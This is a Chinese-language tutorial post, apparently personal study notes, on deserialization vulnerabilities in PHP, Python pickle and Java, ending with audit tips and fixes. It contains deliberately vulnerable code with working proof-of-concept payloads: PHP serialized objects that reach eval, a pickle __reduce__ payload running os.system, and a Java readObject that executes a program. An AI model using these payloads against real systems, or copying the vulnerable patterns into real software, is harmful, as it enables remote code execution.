# 反序列化漏洞


## 反序列化

**序列化：**把对象转换为字符串 存到硬盘中(可以以特定的格式在进程中跨平台、安全的进行通信) -->实际场景会存到数据库中(redis等键值对类型的数据库)

**反序列化：**用到的时候，再把字符串反序列化为对象使用



![](http://image.xpshuai.cn/img/image-20220119091034314.png)





## 漏洞原理

序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。



## PHP反序列化

### 漏洞触发条件：

> 以下三者缺一不可

- unserialize函数的变量可控
- php文件中存在可利用的类
- 类中有魔术方法
  



### 魔术方法

```bash
__construct()    #当一个对象创建时被调用
__destruct()    #当一个对象销毁时被调用
__toString()    #当一个对象被当作一个字符串使用
__sleep()  #在对象在被序列化之前运行
__wakeup    #将在序列化之后立即被调用
__call()     #在对象上下文中调用不可访问的方法时触发
__callStatic() # 在静态上下文中调用不可访问的方法时触发
__get() # 用于从不可访问的属性读取数据
__set() # 用于将数据写入不可访问的属性
__isset() # 在不可访问的属性上调用isset()或empty()触发
__unset() # 在不可访问的属性上使用unset()时触发
__invoke() # 当脚本尝试将对象调用为函数时触发

# 等其他魔术方法
```



先搞清楚序列化之后各个字段的意义:

![](http://image.xpshuai.cn/img/image-20220119091308709.png)



![](http://image.xpshuai.cn/img/image-20220119091604297.png)



例如：

```php
<?php
class Example {
    var $var = '';
    function __destruct() {
        eval($this->var);
    }
}
unserialize($_GET['a']);
?>　
```

接下来构造序列化数据：`a=O:4:"test":1:{s:1:"b";s:10:"phpinfo();";}`

成功显示了phpinfo页面：在反序列化该数据时，自动触发了_destruct()函数,执行 eval(phpinfo()):





### CTF类似题目

https://cgctf.nuptsast.com/challenges#Web
https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=11116&highlight=writeup



```php
<?php
//test
/*
$a='xiaodi';
echo $a."<hr>";
echo serialize($a)."<hr>";
echo unserialize('s:6:"xiaodi";');
*/

/*
//代码执行

class xiaodi{
	var $xd='';
	function __destruct(){
		eval($this->xd);
	}
}
unserialize($_GET['a']);
*/
//O:1:"F":1:{s:3:"var";s:10:"phpinfo();";}
//O:6:"xiaodi":1:{s:2:"xd";s:10:"phpinfo();";}


//sql注入
/*
class sql{
	var $var='';
	function __destruct(){
		echo 'select * from admin where username='.($this->var);
	}
}
unserialize($_GET['a']);
//O:3:"sql":1:{s:3:"var";s:6:"xiaodi";}
*/

class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    
    $o = unserialize($pass);
    
    if ($o) {
        $o->secret = "*";
        if ($o->secret === $o->enter)
            echo "Congratulation! Here is my secret: ".$o->secret;
        else 
            echo "Oh no... You can't fool me";
    }
    else echo "are you trolling?";

//O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
// 值给N, 后面的值给R    N+2=R
?>　

```







## Python反序列化

### 概述

Python中有两个模块可以实现对象的序列化，`pickle`和`cPickle`，区别在于cPickle是用C语言实现的，pickle是用纯python语言实现的，用法类似，cPickle的读写效率高一些。python3标准库中不再叫`cPickle`，而是只有`pickle`。python2中两者都有。



pickle的**应用场景**一般有以下几种：

1. 在解析认证token，session的时候（尤其web中使用的redis、mongodb、memcached等来存储session等状态信息）；
2. 将对象Pickle后存储成磁盘文件；
3. 将对象Pickle后在网络中传输。









### pickle反序列化

#### pickle

pickle 具有两个重要的函数：

- 一个是`dump()`, 作用是接受一个文件句柄和一个数据对象作为参数，把数据对象以特定的格式保存到给定的文件中；
- 另一个函数是`load()`，作用是从文件中取出已保存的对象，pickle 知道如何恢复这些对象到他们本来的格式。

```python
pickle.dump(obj, file, protocol=None, *, fix_imports=True)  #输出为文件对象
pickle.dumps(obj, protocol=None, *, fix_imports=True)  #输出为 bytes 对象

pickle.load(file)  #load参数是文件句柄
pickle.loads(file) #loads参数是字符串
```

**note:** python2中的序列化文件如果想在python3中读取，需要修改编码。

```python
#python2
with open('mnist.pkl', 'rb') as f:
    l = list(pickle.load(f))
    
    
#python3
with open('mnist.pkl', 'rb') as f:
    u = pickle._Unpickler(f)
    u.encoding = 'latin1'
    p = u.load()
```

我这里就只用Python3了



##### `__reduce__`方法

类似于PHP中的`__wakeup__`魔法函数，`pickle`允许任意对象通过定义`__reduce__`方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。第一个参数是可调用(callable)的对象，第二个是该对象所需的参数元组

```none
__reduce__
被定义之后，当对象被Pickle时就会被调用
要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用

__reduce_ex__
首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__
```



构造一个存在漏洞的简单代码：

```python
import os
import pickle


class Test1(object):
    def __reduce__(self):
        return os.system, ('whoami',)


testObj = Test1()
payload = pickle.dumps(testObj)
print(payload)

pickle.loads(payload)

```

![](http://image.xpshuai.cn/img/image-20220119104525612.png)

如果需要在web中请求传输，url编码后就可以发送了。







##### 指定protocol

`pickle.dumps(object)`在生成序列化数据时可以指定protocol参数，其取值包括：

- 当protocol=0时，序列化之后的数据流是可读的（ASCII码）
- 当protocol=3时，为python3的默认protocol值，序列化之后的数据流是hex码

```python
import os
import pickle


class Test1(object):
    def __reduce__(self):
        return os.system, ('whoami',)


testObj = Test1()
payload = pickle.dumps(testObj, protocol=0)
print(payload)
#
# pickle.loads(payload)

print(payload.decode())  # 将byte类型转化为string类型

```





##### pickletools模块

帮助我们了解每一步执行原理。需要我们了解每一个操作符的含义。

- `pickletools.dis(picklestring)`：

  可以更方便的看到每一步的操作原理。

- `pickletools.optimize(picklestring)`：
  **消除未使用的 PUT 操作码之后返回一个新的等效 pickle 字符串**。 优化后的 pickle 将更为简短，耗费更为的传输时间，要求更少的存储空间并能更高效地解封。也即上面分析能够经过简化的过程：



```python
import os
import pickle
import pickletools


class Test1(object):
    def __reduce__(self):
        return os.system, ('whoami',)


testObj = Test1()
payload = pickle.dumps(testObj, protocol=0)
print(payload)
#
# pickle.loads(payload)

# print(payload.decode())  # 将byte类型转化为string类型

pickletools.dis(payload)

```



一些指令集：

```bash
MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
```





### 其他第三方序列化库

```bash
# marshmallow
pip3 install marshmallow

# MessagePack
pip3 install msgpack-python

# PyYAML

# Jsonpickle

# Shelve
```





### 测试方法

1. 查找是否引入pickle/cPickle等序列化库；
2. 若引入则查看并是否进行了pickle.load(param)或pickle.loads(param)操作；
3.  若参数输入可控，则可能存在反序列化漏洞，构造payload进行利用。



### 工具

**pker**：https://github.com/eddieivan01/pker

借助该工具，可以省去人工构造payload，根据自己的相关需求可以自动生成相应的序列化数据。









### **修复方案**

1） 确保反序列化对象**不可控**，且在**传递**前请进行签名或者加密，防止篡改和重播

2） 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据

3）将 pickle 加载的数据列入白名单，可使用官方推荐的find_class方法,使用白名单限制反序列化引入的对象













## Java反序列化

序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。



**Java 序列化**是指把 Java 对象转换为字节序列的过程，便于保存在内存、文件、数据库中，`ObjectOutputStream`类的 `writeObject() `方法可以实现序列化。

反序列化是指把字节序列恢复为 Java 对象的过程，`ObjectInputStream `类的 `readObject()` 方法用于反序列化(能够被反序列化的类必须要实现`Seializable`或者`Externlizable`接口)。



当开发者重写`readObject`方法或者`readExternal`方法时，若其中隐藏一些危险的操作且未对正在进行序列化的字节流进行充分的检测时，则可能存在反序列化漏洞。





![](http://image.xpshuai.cn/img/image-20220119092018167.png)





### 条件

- 类必须实现反序列化接口，同时设置serialVersionUID以便适用不同jvm环境（可通过SerializationDumper这个工具来查看其存储格式,主要包括Magic头：0xaced,TC_OBJECT:0x73,TC_CLASS:0x72,serialVersionUID,newHandle）
- 程序中存在一条可以产生安全问题的利用链(Gadget chain)，如远程代码执行
- 触发点（当程序中某处触发点在还原对象的过程中，能够成功地执行构造出来的利用链，则会成为反序列化漏洞的触发点）





### 反序列化示例

将String对象obj1序列化后写入object文件，后反序列化得到对象obj2:

```java
package src.main.java;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class TestSeri {
    public static void main(String []args) throws Exception{
        //定义obj对象
        String obj = "hello java!";
        //创建一个包含对象进行反序列化信息的 object数据文件
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将obj对象写入object文件
        os.writeObject(obj);

        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream("object");
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        String obj2 = (String)ois.readObject();
        System.out.println(obj2);
        ois.close();
    }
}

```

![](http://image.xpshuai.cn/img/image-20220119100756465.png)

object文件中的内容：

![](http://image.xpshuai.cn/img/image-20220119101145971.png)

其中`Ac ed 00 05`是java序列化内容的**特征**，base64编码后是`rO0ABQ==`

![](http://image.xpshuai.cn/img/image-20220119101214156.png)





### **使用场景:**

• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等

• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）

• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）

• json(Jackson，fastjson) http请求中包含







### 漏洞成因示例

```java
package src.main.java;

import java.io.*;

public class TestSeri {
    public static void main(String []args) throws Exception{
        //定义obj对象
        MyObject myObj = new MyObject();
        myObj.name = "hello";

        //创建一个包含对象进行反序列化信息的 object2数据文件
        FileOutputStream fos = new FileOutputStream("object2");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将obj对象写入object文件
        os.writeObject(myObj);

        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream("object2");
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        MyObject objDisk = (MyObject)ois.readObject();
        System.out.println(objDisk.name);
        ois.close();
    }
}


class MyObject implements Serializable{
    public String name;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序的命令
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

查看文件内容：

![](http://image.xpshuai.cn/img/image-20220119102101701.png)

漏洞发生在反序列化过程，MyObject类实现了Serializable接口，并重写了readObject()函数（从源输入流中读取字节序列，反序列化成对象），这里定制的行为是打开计算器：

![](http://image.xpshuai.cn/img/image-20220119102001598.png)

攻击时序图：

![](http://image.xpshuai.cn/img/image-20220119101931782.png)









### 代码审计

#### 常见关键字：

```bash
ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readvalue
JON.parseObject
...

```



#### 简要思路

当我们搜索到关键函数或库，找到存在反序列化操作的文件时，便可以开始考虑参数是否可控，以及他们应用的CLass Path中是否包含了`Apache Commons COllections`等危险库(`ysoseial`所支持的其他库亦可)。同时满足这些条件后，我们便可以通过`ysoseial`生成所需的命令执行的反序列化语句。

当然，不支持`Apache Commons COllections`d等危险库，并不代表我们不能进一步利用。这种情况，我们可以通过查找其他代码中涉及的执行命令或代码的区域。通过构造利用链来达到任意代码执行的目的。







#### 拓展

##### 反射机制

JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。



##### RMI

Java RMI(Java Remote Method Invocation, Java远程方法调用)是允许允许在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法、这两个虚拟机可以运行在相同计算机的不同进程中，也可以运行在网络上的不同计算机中。

在网络传输中，RMI中的对象是通过序列化方式进行编码传输的。这意味着，RMI在接收经过序列化编码的对象后会进行反序列化操作。因此可以通过RMI服务作为反序列利用链的触发点。



##### JNDI

JNDI（Java Naming and Directory Interface， Java命令和目录接口）是一组程序接口，目的是方便查找远程或是本地对象。JNDI典型的应用场景是配置数据源，除此之外，JNDI还能访问现有的目录和服务，如LDAP,RMI,COBA,DNS,NDS,NIS等。

JNDI注入利用流程：



#### 历史漏洞

> 需要个人动态调试来复现，暂未进行

##### Apache Commons Collections反序列化漏洞





##### Shiro反序列化漏洞





##### FastJson反序列化漏洞





##### weblogic反序列化漏洞







## 漏洞修复

- 如果是java中使用`readObject()`反序列化时，首先会调用`resolveClass`方法读取反序列化的类名，所以我们可以通过重写`ObjectInputStream`对象的`resolveClass`方法来实现对反序列化类的校验
- 









## 参考

[PHP反序列化漏洞 - 爪爪** - 博客园 (cnblogs.com)](https://www.cnblogs.com/xiaoqiyue/p/10951836.html)

[CTF PHP反序列化 - MustaphaMond - 博客园 (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/11403397.html)

[反序列化漏洞汇总 (qq.com)](https://mp.weixin.qq.com/s/wSuTztqzK-D9lxSPhhptgw)

[Python反序列化漏洞与沙箱逃逸 - UCASZ的小站 (ucasers.cn)](https://ucasers.cn/python反序列化漏洞与沙箱逃逸/)

payload：https://github.com/sensepost/anapickle


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

